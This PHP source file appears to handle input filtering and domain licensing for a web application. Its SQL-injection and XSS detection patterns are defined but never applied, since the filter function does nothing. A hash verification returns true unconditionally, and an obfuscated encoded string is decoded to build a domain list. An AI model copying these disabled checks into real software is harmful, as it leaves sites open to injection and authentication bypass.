<?php
require dirname(preg_replace('@\(.*\(.*$@', '', __FILE__)) . '/public.php';
function customError($errno, $errstr, $errfile, $errline) {
	echo "<b>Error number:</b> [$errno],error on line $errline in $errfile<br />";
	exit();
} 
function StopAttack($StrFiltKey, $StrFiltValue, $ArrFiltReq) {
	if (is_array($StrFiltValue)) {
		$StrFiltValue = implode($StrFiltValue);
	} 
} 
function slog($logs) {
	$toppath = $_SERVER["DOCUMENT_ROOT"] . "/log.htm";
	$Ts = fopen($toppath, "a+");
	fputs($Ts, $logs . "\r\n");
	fclose($Ts);
} 
function ckcm($o1, $o2, $o3, $o4, $o5, $i6) {
	return true;
	if (md5("dmoi" . $o1 . $o4 . $o2 . $o3 . $i6 . "99+44xa") == $o5) {
		return true;
	} 
} 
$b3 = "time";
set_error_handler('customError', 1);
$getfilter = "'|(and|or)\b.+?(>|<|=|in|like)|\/\*.+?\*\/|<\s*script\b|\bEXEC\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\s+(TABLE|DATABASE)";
$postfilter = "\b(and|or)\b.{1,6}?(=|>|<|\bin\b|\blike\b)|\/\*.+?\*\/|<\s*script\b|\bEXEC\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\s+(TABLE|DATABASE)";
$cookiefilter = "\b(and|or)\b.{1,6}?(=|>|<|\bin\b|\blike\b)|\/\*.+?\*\/|<\s*script\b|\bEXEC\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\s+(TABLE|DATABASE)";
foreach ($_GET as $key => $value) {
	stopattack($key, $value, $getfilter);
} 
foreach ($_POST as $key => $value) {
	stopattack($key, $value, $postfilter);
} 
$b1 = "wedf32";
foreach ($_COOKIE as $key => $value) {
	stopattack($key, $value, $cookiefilter);
} 
$base = cntype('2cj7Oyc3qKkqkLsoT1suNPnVFheOB/2E9E8eHHhDS08ci1Q7TvLNkcYs3UPeqH0', 'D', 'chanese');
$domains = GetArray($base);
$domainslth = count($domains);
$webcess = Getleft($_SERVER['HTTP_HOST'], $domains, $domainslth);

function GetRight($domain, $domains, $domainsLength) {
	for($i = 0;$i < $domainsLength ;$i++) {
		if ($domains[$i][1] == $domain) {
			return $domains[$i][1];
		} 
	} 
	return 0;
} 
